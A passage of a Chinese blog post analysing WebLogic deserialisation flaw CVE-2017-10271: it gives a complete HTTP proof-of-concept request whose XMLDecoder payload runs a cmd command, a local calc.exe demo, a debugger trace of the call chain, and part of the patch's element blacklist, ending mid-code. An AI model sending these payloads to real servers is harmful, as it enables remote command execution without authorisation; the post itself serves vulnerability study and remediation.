                <time title="Modified: 2020-11-13 15:13:58" itemprop="dateModified" datetime="2020-11-13T15:13:58+08:00">2020-11-13</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞分析</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​    CVE-2017-10271漏洞是由于通过readobject解析webservice接口中的xml代码导致命令执行的，今天我们一起学习一下这个漏洞是如何导致的并分析一下漏洞的检测方法。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>​        这里直接给出文件写入的poc，数据包如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">POST http:&#x2F;&#x2F;192.168.3.1:7001&#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.3.1:7001</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 613</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;cmd&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;&#x2F;c&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;echo 111 &gt; c:\windows\temp\test666.txt&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;java&gt;</span><br><span class="line">&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>​        利用成功后会返回500，不过这并不影响我们的命令执行。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201030232045855.png" alt="image-20201030232045855"></p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201030232431039.png" alt="image-20201030232431039"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​        因为这个漏洞在利用成功之后会返回调用栈，所以我们可以直接在最终调用的函数上打一个断点，那样就能直观的看到这个漏洞执行的调用链。这里我们可以看到最终执行的java.lang.ArrayIndexOutOfBoundsException类里的方法抛出异常，因此我们找到这个类。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201031102101881.png" alt="image-20201031102101881"></p>
<p>​        可以使用快捷键ctrl+alt+shift+n来快速找到这个类名。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201031102202120.png" alt="image-20201031102202120"></p>
<p>​        我们找到ArrayIndexOutOfBoundsException后，因为从调用栈中看不到调用了哪个方法，因此我们在这个类中仅有的三个方法中下断点，发送payload进行测试，在传递String类型参数的方法中断住了，然后我们在idea中，就可以看到这个漏洞的一个整体的调用栈。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201031103008416.png" alt="image-20201031103008416"></p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201031103137794.png" alt="image-20201031103137794"></p>
<p>​        为了测试哪些调用和我们的访问路径有关，哪些调用栈是weblogic运行过程中本身调用的，我对调用栈中的调用进行了测试，我发现只要我们运行着weblogic，ExecuteThread类的execute方法总是会被不断调用的。即使我没有向weblogic发送任何请求。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201031105302535.png" alt="image-20201031105302535"></p>
<p>​        而ServletRequestImpl类的run方法，只有我们访问wls-wsat目录下的方法时才会被调用，访问其他目录则不会被调用。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201031105346498.png" alt="image-20201031105346498"></p>
<p>​        我们再来看一下当我们访问/wls-wsat/CoordinatorPortType目录时的调用流程，当我们访问到这个url时，会被路由到wls-wsat.war包下进行处理，我们看下web.xml文件，发现这个调用会交给weblogic.wsee.wstx.wsat.v10.endpoint.CoordinatorPortTypePortImpl类进行处理。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201101195556241.png" alt="image-20201101195556241"></p>
<p>​        我们跟进到这个类中，可以看到这个类是一个处理webservice的接口，</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201101195741595.png" alt="image-20201101195741595"></p>
<p>​        由于对webservice不是很熟悉，跟进去CoordinatorPortType接口中也没看懂这个接口是执行了什么操作，不过这个好像也无关紧要，因为我发现即使调用其他路由也是可以成功触发漏洞的，所以说明这个漏洞的触发和这个接口具体的参数没有什么关系。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201101213816637.png" alt="image-20201101213816637"></p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201101213858504.png" alt="image-20201101213858504"></p>
<p>​        好了，我们回归正题，我们通过查看调用链可以知道，这个漏洞最终之所以能被触发是因为调用了xmlDecoder.readObject()方法，因此我们只要理清是什么原因导致了可以调用到这个方法就可以了。</p>
<p>​        首先调用了一些servlet处理的方法，关于servlet调用的过程比较复杂，我不一一分析了，这里仅仅向大家证明这个调用栈的哪些部分属于servlet的调用。</p>
<p>​        我随便找了一个servlet的接口以GET方式去请求，可以在StubSecurityHelper$ServletServiceAction  run方法上下到断点，因此我们可以理解只要去调用servlet的接口，这些方法都会被调用，因此我们在分析的过程中可以不看这些调用栈，可以简单的理解为对于servlet处理的过程。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201101222906523.png" alt="image-20201101222906523"></p>
<p>​        而后面的一些方法则需要调用jaxws包下的内容，我们知道jaxws是用来处理webservice的，因此只有处理webservice时，后面的方法才会被调用，因此这个漏洞的触发需要调用webservice的方法。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201101233441734.png" alt="image-20201101233441734"></p>
<p>​        我们着重分析一下JAXWServlet以后的处理流程，先看一下doRequest方法，这个方法首先设置了一些属性，再去判断调用的请求类型，由于我们调用的是POST方法，因此调用了httpProcessor.post（）</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201102232400860.png" alt="image-20201102232400860"></p>
<p>​        从post到handle部分可能主要是做一些权限认证方面的处理，认证通过后调用handle进行处理</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111202947944.png" alt="image-20201111202947944"></p>
<p>​    从header 到processRequest部分因为看不到代码所以也看不出来weblogic是如何处理这部分内容的</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111204148540.png" alt="image-20201111204148540"></p>
<p>​    processRequest方法处理过程如下，首先判断传入的var1是否为空，判断部位空后获取header,再从获取的header中查找是否存在WORK_AREA_HEADER,如果存在，则执行readHeaderOld方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111204541538.png" alt="image-20201111204541538"></p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111204411985.png" alt="image-20201111204411985"></p>
<p>​    在readHeaderOld方法中，将我们输入的请求体的内容进行解析，注意new WorkContextXmlInputAdapter()操作，跟进WorkContextXmlInputAdapter，实际上这里是创建一个xmldecoder对象并且将我们的请求体内容传进去。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111205220071.png" alt="image-20201111205220071"></p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111205354553.png" alt="image-20201111205354553"></p>
<p>​    创建WorkContextXmlInputAdapter对象以后，调用receive方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111210231033.png" alt="image-20201111210231033"></p>
<p>​    再经过几层调用，来到readEntry方法，调用了xmldecoder.readObject()方法进行解析，最终导致了反序列化xml代码和命令执行。<img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111210332731.png" alt="image-20201111210332731"></p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201111210620461.png" alt="image-20201111210620461"></p>
<p>​    可能有些同学不理解为什么xmldecoder.readObject()会导致反序列化，我这里写一个demo代码进行测试。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import java.beans.XMLDecoder;</span><br><span class="line">import java.io.BufferedInputStream;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line"></span><br><span class="line">public class xmldecoder &#123;</span><br><span class="line">    public static void main(String[] args) throws FileNotFoundException &#123;</span><br><span class="line">        File file &#x3D;new File(&quot;d:\\test.xml&quot;);</span><br><span class="line">        FileInputStream fis &#x3D; new FileInputStream(file);</span><br><span class="line">        BufferedInputStream bis &#x3D; new BufferedInputStream(fis);</span><br><span class="line">        XMLDecoder xdsec &#x3D; new XMLDecoder(bis);</span><br><span class="line">        xdsec.readObject();</span><br><span class="line">        xdsec.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    在d:\test.xml的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;java version&#x3D;&quot;1.8.0_131&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">    &lt;object class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">        &lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;1&quot;&gt;</span><br><span class="line">            &lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">                &lt;string&gt;calc.exe&lt;&#x2F;string&gt;</span><br><span class="line">            &lt;&#x2F;void&gt;</span><br><span class="line">        &lt;&#x2F;array&gt;</span><br><span class="line">        &lt;void method&#x3D;&quot;start&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;object&gt;</span><br><span class="line">&lt;&#x2F;java&gt;</span><br></pre></td></tr></table></figure>

<p>​    当执行完readaobject后，我们的xml代码被执行</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201112175014300.png" alt="image-20201112175014300"></p>
<p>​    看完上面的代码，我想我们已经知道xmldecoder.readobject可以造成命令执行了，不过为什么我们传入的xml内容会被解析并最终导致命令执行呢？我跟进了这个readObject的调用过程，由于整体的调用过程比较复杂，我就不具体分析了，这里先给出调用链</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201112194152425.png" alt="image-20201112194152425"></p>
<p>​    主要的执行部分在getValueObject这个方法中，因此我们主要看一下这个方法,这个方法在我解析这个xml的过程中被调用了三次，首先判断Index是否为空，第一次解析过程中我们index的内容不为空，而是0，因此会进入这个if判断，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;&lt;&#x2F;void&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113101448089.png" alt="image-20201113101448089"></p>
<p>​    并且由于var2的内容为2,因此var4的值会被设置为set</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113101928381.png" alt="image-20201113101928381"></p>
<p>​    之后程序会执行到下面这段代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expression var5 &#x3D; new Expression(var3, var4, var2);</span><br></pre></td></tr></table></figure>

<p>​    跟进去后发现其会调用父类的构造方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113102206786.png" alt="image-20201113102206786"></p>
<p>​    跟进父类的构造方法，会给target，methodName，arguments分别进行赋值</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113102301063.png" alt="image-20201113102301063"></p>
<p>​    最后程序会调用var5.getValue()方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113102428144.png" alt="image-20201113102428144"></p>
<p>​        跟进getvalue()方法后，我们看到又调用了invoke方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113102524670.png" alt="image-20201113102524670"></p>
<p>​    跟进invoke方法，首先会做一个权限判断，判断完成后会调用invokeInternal方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113102652354.png" alt="image-20201113102652354"></p>
<p>​    invokeInternal方法是命令执行的重点，我们跟进去看一下，首先通过获取当前对象的target和methodName，这两个值之前已经经过了设置。再获取arguments的内容，再判断methodName是否包含forName，如果包含则通过反射来创建类，我们调用的methodName不包含forName，所以不会执行if语句中的内容。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113102945526.png" alt="image-20201113102945526"></p>
<p>​    下面再去获取了arguments的类型，我们传入的两个参数一个是0一个是calc.exe，因此是integer和String类型</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113103829117.png" alt="image-20201113103829117"></p>
<p>​    最后程序会将arguments[0]转换后赋值给index，最后调用Array.set设置值，设置完以后大概是target[0]=”calc.exe”这个样子，到此第一次调用结束。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113110701464.png" alt="image-20201113110701464"></p>
<p>​    第二次调用中，index的内容为空，并且property也为空，因此会进入到else代码中，因为method的值为null，因此var4会被设置为new</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113104635913.png" alt="image-20201113104635913"></p>
<p>​    再跟进 new Expression(var3, var4, var2),在父类的构造方法中，对target，methodName,和arguments的参数进行设置。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113110930916.png" alt="image-20201113110930916"></p>
<p>​    我们再看一下invokeInternal方法， 首先还是获取target,methodName,arguments参数，判断methodName是否包含forname,这里methodName为new，因此不会进入if判断。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113111115897.png" alt="image-20201113111115897"></p>
<p>​    下面再判断了target是否为Class类型的实例，这里会进入if判断，将methodName设置为newInstance，再到第二个if判断，由于(Class)target).isArray()不是array，因此会跳过这个if判断</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113111320290.png" alt="image-20201113111320290"></p>
<p>​        在往下走，methodName和arguments满足if判断，因此会进入第一个if判断，但是由于target 不是Character.class，因此不会进入第二个if判断。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113112023557.png" alt="image-20201113112023557"></p>
<p>​    再往下走，通过ConstructorFinder.findConstructor获取类class java.lang.ProcessBuilder参数为String[]类型的构造器</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113112709493.png" alt="image-20201113112709493"></p>
<pre><code>最后通过newInstance获取一个实例对象，至此第二次调用结束了。</code></pre><p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113112934347.png" alt="image-20201113112934347"></p>
<p>​    在第三次调用中，var4为start</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113113230022.png" alt="image-20201113113230022"></p>
<p>​    跟进Expression调用的父类构造方法，我们可以看到这次传入的target和arguments内容都为对象，methodName为start</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113113347471.png" alt="image-20201113113347471"></p>
<p>​    之后我们再看一下invokeInternal方法，再287行通过反射调用获取到了start方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113113815896.png" alt="image-20201113113815896"></p>
<p>​    最后通过invoke来调用processbuilder.start方法，导致calc.exe被执行。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113113850934.png" alt="image-20201113113850934"></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>​    最后我们看一下weblogic对这个漏洞是如何修复的，我尝试在官网下载补丁，但好像是付费用户才能下载到</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113135529651.png" alt="image-20201113135529651"></p>
<p>​    没有办法，只能在网上看别人的代码，补丁代码如下，在进行解析的时候对object,new,method,viod等关键设置了黑名单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public void startElement(String uri, StringlocalName, String qName, Attributes attributes) throws SAXException &#123;</span><br><span class="line">if(qName.equalsIgnoreCase(“object”))&#123;</span><br><span class="line">throw newIllegalStateException(“Invalid element qName:object”);</span><br><span class="line">&#125; else if(qName.equalsIgnoreCase(“new”))&#123;</span><br><span class="line">throw newIllegalStateException(“Invalid element qName:new”);</span><br><span class="line">&#125; else if(qName.equalsIgnoreCase(“method”))&#123;</span><br><span class="line">throw newIllegalStateException(“Invalid element qName:method”);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">if(qName.equalsIgnoreCase(“void”)) &#123;</span><br><span class="line">for(int attClass &#x3D; 0; attClass&lt; attributes.getLength(); ++attClass) &#123;</span><br><span 